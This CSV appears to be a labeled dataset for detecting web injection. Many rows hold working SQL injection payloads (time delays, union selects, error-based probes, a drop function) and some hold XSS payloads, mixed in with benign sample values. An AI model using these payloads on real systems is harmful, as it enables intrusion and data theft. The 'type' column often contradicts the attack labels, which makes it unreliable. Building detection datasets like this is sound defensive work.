Text,attack_type,Label,type
"-3194""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""erua""=""erua",sqli,1,sql
heldabrand5@chevrolet-volt.bg,norm,0,normal
"1))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((3977=3977",sqli,1,sql
"1"") as evoq where 8193=8193 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
09665,norm,0,normal
1'))) rlike (select (case when (5855=7142) then 1 else 0x28 end)) and ((('fkhd'='fkhd,sqli,1,sql
sansalva farreron,norm,0,normal
ann-hoon,norm,0,normal
"1%""))) and make_set(8403=8403,8899) and (((""%""=""",sqli,1,normal
"1"" where 8379=8379 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
alegra,norm,0,normal
gladiolos 30,norm,0,normal
hermida fiordalizzi,norm,0,normal
4107,norm,0,normal
"1%""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""%""=""",sqli,1,sql
"callejon pavaneras, 69 6?b",norm,0,normal
1 where 7021=7021 or 6793=(select 6793 from pg_sleep(5))--,sqli,1,sql
fresno de torote,norm,0,normal
de4737ur6a,norm,0,normal
petunia,norm,0,normal
sant pere de ribes,norm,0,normal
resmini@barebackspain.yu,norm,0,normal
9218,norm,0,normal
1%') and 7533=7533 and ('%'=',sqli,1,normal
1')) as wjfj where 3802=3802;if(8574=7534) select 8574 else drop function nxbe--,sqli,1,sql
bernaus,norm,0,normal
tahsin,norm,0,normal
"1%"")) and elt(3114=3114,sleep(5))#",sqli,1,normal
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))-- gkcl",sqli,1,sql
"avda. infante don jaime, 133,",norm,0,normal
"1%')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('%'='",sqli,1,sql
"calle padre arintero, 149",norm,0,normal
"1"") where 3679=3679;waitfor delay '0:0:5'--",sqli,1,sql
"-1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>",xss,2,sql
44711,norm,0,normal
tanglao,norm,0,normal
17536,norm,0,normal
ondina viejo,norm,0,normal
3175397567040813,norm,0,normal
2881,norm,0,normal
ha3fila,norm,0,normal
roseman-hensley@fighting-machines.wf,norm,0,normal
braden,norm,0,normal
c632i6ela,norm,0,normal
1'+(select 'toec' where 5810=5810 and sleep(5))+',sqli,1,sql
1'+(select 'lcru' where 3215=3215;select case when 7717=7717 then 1 else null end--,sqli,1,sql
lupin colombo,norm,0,normal
nobutaka,norm,0,normal
"-2570"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""dmch"" like ""dmch",sqli,1,sql
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pziy'='pziy,sqli,1,sql
49159005r,norm,0,normal
those,norm,0,normal
tewksbur,norm,0,normal
312,norm,0,normal
mediona,norm,0,normal
08149938a,norm,0,normal
"1"" where 7599=7599;begin user_lock.sleep(5); end--",sqli,1,sql
"1'+(select 'asdq' where 4023=4023 and make_set(8403=8403,8899))+'",sqli,1,sql
1) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
scriptdocument.cookie=true;/script,xss,2,sql
"1"" waitfor delay '0:0:5'--",sqli,1,sql
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'hmqd'='hmqd",sqli,1,sql
1973457393131031,norm,0,normal
p5lm9269,norm,0,normal
tauber5@lamolahotel.bb,norm,0,normal
"-2106"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""dvlq"" like ""dvlq",sqli,1,sql
014e35,norm,0,normal
"1)) union all select null,null,null,null,null,null,null#",sqli,1,sql
b5rr1mbada,norm,0,normal
"1"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
buddy0,norm,0,normal
"-9281) where 8363=8363 or make_set(8220=5127,5127)--",sqli,1,sql
ubraco,norm,0,normal
chatri1,norm,0,normal
"calle juan de mena, 133",norm,0,normal
aveinte,norm,0,normal
marlowe,norm,0,normal
"1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--",sqli,1,sql
9.84is22nte334c799,norm,0,normal
santo,norm,0,normal
2473968960827836,norm,0,normal
1'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
b*uba,norm,0,normal
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ygfv'='ygfv",sqli,1,sql
-6453%')) or (8459=8459)*4906 and (('%'=',sqli,1,normal
vasilopo,norm,0,normal
82751097h,norm,0,normal
1) and 2006=2006,sqli,1,normal
-9847%'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('%'=',sqli,1,sql
09580,norm,0,normal
d6s316ar,norm,0,normal
lightfie,norm,0,normal
1 where 5828=5828 and (3020=3020)*6703--,sqli,1,sql
celada lurhmann,norm,0,normal
34468,norm,0,normal
villanueva de algaidas,norm,0,normal
"-7418 union all select 1340,1340,1340,1340,1340#",sqli,1,sql
"1'+(select 'vwzp' where 2729=2729 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1%'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='",sqli,1,sql
torre de arcas,norm,0,normal
vallclara,norm,0,normal
"1') as hats where 2011=2011 union all select null,null,null,null,null#",sqli,1,sql
lockin.konstantia@modeloscaninos.kn,norm,0,normal
proffit,norm,0,normal
adriel,norm,0,normal
09471,norm,0,normal
71997567t,norm,0,normal
palera,norm,0,normal
peaflor,norm,0,normal
"1 where 1992=1992 union all select null,null--",sqli,1,sql
de jongh algarra,norm,0,normal
7301,norm,0,normal
pawlikowski@clo2.tw,norm,0,normal
"1"" where 3318=3318;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
chinaphan@viajesdacapalla.eh,norm,0,normal
ganzel@wdsl.tr,norm,0,normal
"1%"") waitfor delay '0:0:5' and (""%""=""",sqli,1,normal
"-8833')) union all select 3227,3227,3227,3227,3227--",sqli,1,sql
04888,norm,0,normal
"-1051"") where 6586=6586 or 6647=6738#",sqli,1,normal
1'||(select 'yhpe' where 8010=8010 rlike (select (case when (7910=3752) then 1 else 0x28 end)))||',sqli,1,sql
raimulfo,norm,0,normal
"1' in boolean mode);select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mwyu'='mwyu",sqli,1,sql
"c/ alfara de algimia, 184",norm,0,normal
quintanilla del coco,norm,0,normal
3363230401310436,norm,0,normal
1'||(select 'bifa' where 6077=6077 and 4547=9301,sqli,1,sql
11039917d,norm,0,normal
"-5275%')) union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",sqli,1,sql
"1%' procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
retorta,norm,0,normal
pinilla del valle,norm,0,normal
enviada,norm,0,normal
"glorieta antonio molina 87,",norm,0,normal
1') as zxos where 2745=2745;select pg_sleep(5)--,sqli,1,sql
31650,norm,0,normal
goth-komarov@frenchpolynesia.com.mg,norm,0,normal
34491,norm,0,normal
indemostrable,norm,0,normal
"1));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
24710,norm,0,normal
espronceda,norm,0,normal
"-1641'||(select 'jfnu' where 7682=7682 union all select 7682,7682,7682--",sqli,1,sql
06690,norm,0,normal
4u9_l5o,norm,0,normal
maughan@enfuerteventura.com.rw,norm,0,normal
357,norm,0,normal
o.toole,norm,0,normal
harrold_elloy@santacruzdelvoto.ci,norm,0,normal
"-1631%"") or elt(8285=1709,1709) and (""%""=""",sqli,1,normal
br9621.0,norm,0,normal
9129,norm,0,normal
"-6996%"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
"-7725%')) union all select 4559,4559,4559,4559,4559,4559,4559,4559,4559--",sqli,1,sql
02129,norm,0,normal
45280,norm,0,normal
yebra de basa,norm,0,normal
"-6249'))) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",sqli,1,sql
huc55,norm,0,normal
5829,norm,0,normal
leira johe,norm,0,normal
bacio bonnin,norm,0,normal
c/ san ildefonso 106 10?h,norm,0,normal
charpini_daillie@inmobiliariahangar.ly,norm,0,normal
yuste,norm,0,normal
regazo,norm,0,normal
a92974d4r,norm,0,normal
"1'||(select 'ukfj' where 7133=7133 union all select null,null,null#",sqli,1,sql
dudas@google-movil.np,norm,0,normal
59137152n,norm,0,normal
4089,norm,0,normal
"inocencia alayon, s/n 4-f",norm,0,normal
"1""))) order by 1#",sqli,1,normal
d2s7sp79ro,norm,0,normal
daigneau,norm,0,normal
aburgues1rs7,norm,0,normal
22535,norm,0,normal
"1'+(select 'jhce' where 1117=1117 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",sqli,1,sql
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('gmbd'='gmbd",sqli,1,sql
"1"") as ubva where 6369=6369 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
petn,norm,0,normal
"plaza esquivias, 68, 5?g",norm,0,normal
p5r0i9i5ar,norm,0,normal
94lp90ulo,norm,0,normal
"1"")) waitfor delay '0:0:5' and ((""koni"" like ""koni",sqli,1,normal
1%')) waitfor delay '0:0:5'--,sqli,1,sql
"-2518' union all select 6818,6818,6818,6818,6818,6818#",sqli,1,sql
51993302p,norm,0,normal
lecompte,norm,0,normal
"c/ tello de guzman 158,",norm,0,normal
prab8,norm,0,normal
colobran rebull,norm,0,normal
joux@viajessolomujeres.nf,norm,0,normal
horalek,norm,0,normal
"1) where 5096=5096 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
37329,norm,0,normal
lujn,norm,0,normal
05619,norm,0,normal
1' and 2006=2006,sqli,1,normal
"1"") where 5197=5197 and elt(3114=3114,sleep(5))#",sqli,1,normal
"1"")) as ccjk where 1932=1932 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1"") where 1607=1607;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"1%""))) waitfor delay '0:0:5'--",sqli,1,sql
sant lloren des cardassar,norm,0,normal
"1) as zdym where 1578=1578 union all select null,null,null#",sqli,1,sql
marina vicent 181 12h,norm,0,normal
victoria de los angeles,norm,0,normal
mora de rubielos,norm,0,normal
h61ng19a,norm,0,normal
fonolla calera,norm,0,normal
78595518x,norm,0,normal
"1%')) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1')) as rxhe where 3838=3838 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"paseo marinero luis de torres, 81, 4?e",norm,0,normal
"-6130 union all select 3211,3211,3211,3211,3211,3211,3211,3211,3211#",sqli,1,sql
"-3805""))) union all select 9123,9123,9123,9123,9123,9123,9123,9123#",sqli,1,sql
"1') as sagj where 4558=4558;select count(*) from generate_series(1,5000000)--",sqli,1,sql
de_souza,norm,0,normal
"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",sqli,1,sql
gorcy.davis@carmensanmartin.bo,norm,0,normal
44588,norm,0,normal
-9145') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('yvfl' like 'yvfl,sqli,1,sql
2039960928892251,norm,0,normal
16600,norm,0,normal
dnica,norm,0,normal
braham,norm,0,normal
"patio pico de aneto, 122 13-c",norm,0,normal
spickelm,norm,0,normal
salv sagra,norm,0,normal
4734,norm,0,normal
armengol sieira,norm,0,normal
"1"") as rovd where 3764=3764 and elt(4249=4249,7259)--",sqli,1,sql
valdiviezo montull,norm,0,normal
"1') where 1212=1212;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
gauchaje,norm,0,normal
mgi4a,norm,0,normal
4358738088308536,norm,0,normal
23698990c,norm,0,normal
"1)) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((2748=2748",sqli,1,sql
"1)) union all select null,null--",sqli,1,sql
5886675578398805,norm,0,normal
0207128835612195,norm,0,normal
"1'||(select 'fbtm' where 1335=1335 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",sqli,1,sql
chistiakov@zytechwind.ke,norm,0,normal
7966926695826035,norm,0,normal
tienchie,norm,0,normal
1) where 1203=1203 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
torre-pacheco,norm,0,normal
"1%'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='",sqli,1,sql
"-9565"" where 1616=1616 union all select 1616,1616,1616,1616--",sqli,1,sql
datario,norm,0,normal
98918059g,norm,0,normal
torrent refojo,norm,0,normal
1 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
1') and 1987=3756#,sqli,1,normal
"1'+(select 'wkcq' where 1020=1020 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,sql
satorras maynol,norm,0,normal
2262,norm,0,normal
deli6escenci1,norm,0,normal
"-8382"")) order by 1--",sqli,1,sql
doct4r9miento,norm,0,normal
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)-- mwsm",sqli,1,sql
cualquiera,norm,0,normal
"-7683"") where 9664=9664 union all select 9664,9664,9664,9664,9664,9664,9664#",sqli,1,sql
"1%' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"-6263"" union all select 8005,8005#",sqli,1,sql
5525531016614315,norm,0,normal
epnimo,norm,0,normal
fuente el saz de jarama,norm,0,normal
"1%""));select pg_sleep(5) and ((""%""=""",sqli,1,sql
"1')) as zari where 6847=6847;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1)) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((5888=5888",sqli,1,sql
blasco rossetti,norm,0,normal
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx'='fbnx",sqli,1,sql
anselmo,norm,0,normal
3836034601398143,norm,0,normal
"1') where 6408=6408;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
8513796211360261,norm,0,normal
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('xcxr' like 'xcxr",sqli,1,sql
1%') or 6793=(select 6793 from pg_sleep(5)) and ('%'=',sqli,1,sql
rosalinda,norm,0,normal
"c/ cea, 107,",norm,0,normal
"1%""));iif(7011=2522,1,1/0)",sqli,1,sql
1'+(select tart where 9861=9861;begin dbms_lock.sleep(5); end--,sqli,1,sql
5761,norm,0,normal
42218,norm,0,normal
5521,norm,0,normal
1));begin dbms_lock.sleep(5); end--,sqli,1,sql
-3161') or 8501=1796,sqli,1,normal
-8007')) as bgpp where 9555=9555 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1,sql
clovis,norm,0,normal
25182,norm,0,normal
4730,norm,0,normal
roadman@wdsl.gu,norm,0,normal
04271,norm,0,normal
harris,norm,0,normal
chapurrar,norm,0,normal
presencio,norm,0,normal
"c/ la haya, 109 13-d",norm,0,normal
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",sqli,1,sql
64179446q,norm,0,normal
quitral blasi,norm,0,normal
<body onload=alert('crosssitescripting')>,xss,2,xss
"vallbona, 72 3?b",norm,0,normal
7974,norm,0,normal
segura de toro,norm,0,normal
nowack@softwaresaas.bm,norm,0,normal
"1)));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1;select count(*) from generate_series(1,5000000)# fnck",sqli,1,sql
aldehuela del codonal,norm,0,normal
"<div style=""width: expression(alert('xss'));"">",xss,2,sql
mariabel,norm,0,normal
chayle villablanca,norm,0,normal
olas del rey,norm,0,normal
"1' where 8729=8729;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
27581268j,norm,0,normal
marino,norm,0,normal
7a7i86,norm,0,normal
bablica,norm,0,normal
palter@biosoftware.in,norm,0,normal
"calle salvatierra 196,",norm,0,normal
llambric acebron,norm,0,normal
"calle costa brava, 148,",norm,0,normal
ons,norm,0,normal
"o casal 135, 4?a",norm,0,normal
"1);select count(*) from generate_series(1,5000000) and (8997=8997",sqli,1,sql
"-7485%'))) union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",sqli,1,sql
3ube3a,norm,0,normal
sandie,norm,0,normal
farr,norm,0,normal
t6t2lado,norm,0,normal
"1"") where 5719=5719 rlike sleep(5)--",sqli,1,sql
b82r8l23o,norm,0,normal
0106099240126772,norm,0,normal
"1') union all select null,null,null,null,null,null,null,null#",sqli,1,sql
cenheg,norm,0,normal
forn gndara,norm,0,normal
v$idr3ar,norm,0,normal
doerksen,norm,0,normal
"1%' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and '%'='",sqli,1,normal
<body onload=alert('xss')>,xss,2,xss
daciano,norm,0,normal
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('sucj'='sucj",sqli,1,sql
entresurco,norm,0,normal
tucker.faulkner@clichotel.ck,norm,0,normal
"1""))) union all select null--",sqli,1,sql
morales orpinell,norm,0,normal
97060354d,norm,0,normal
<img id=xss src='javascript:alert('xss'),xss,2,xss
yvone,norm,0,normal
24429,norm,0,normal
63395358k,norm,0,normal
"1"")) order by 1--",sqli,1,sql
33470889r,norm,0,normal
fornea,norm,0,normal
"1';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'bzxo' like 'bzxo",sqli,1,sql
"1"") where 3404=3404 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
los polancos 133,norm,0,normal
"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('crosssitescripting');"">",xss,2,xss
"glorieta musico emilio alvarez anton 153,",norm,0,normal
regis@magritte.us,norm,0,normal
62776679l,norm,0,normal
anest1sica,norm,0,normal
decacque,norm,0,normal
de la barca pitti,norm,0,normal
mcanally@rockefeller.bt,norm,0,normal
lag@xavipetit.lu,norm,0,normal
44132,norm,0,normal
"-9758'+(select 'rlcy' where 3691=3691 union all select 3691,3691,3691,3691,3691,3691,3691--",sqli,1,sql
1%';select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
villena,norm,0,normal
de_salis,norm,0,normal
964,norm,0,normal
"1',(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",sqli,1,sql
